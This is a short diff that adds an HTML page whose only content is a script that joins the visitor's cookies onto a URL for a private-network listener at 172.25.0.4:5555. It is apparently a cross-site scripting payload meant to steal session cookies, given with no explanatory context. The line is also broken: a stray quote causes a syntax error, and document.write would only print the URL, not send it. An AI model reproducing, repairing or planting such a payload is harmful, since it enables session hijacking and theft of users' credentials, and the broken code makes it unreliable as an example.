@@ -1,0 +1,6 @@
+<html>
+ <script>
+ document.write('http://172.25.0.4:5555?c='+escape(document.cookie)');
+ </script>
+</html>
+
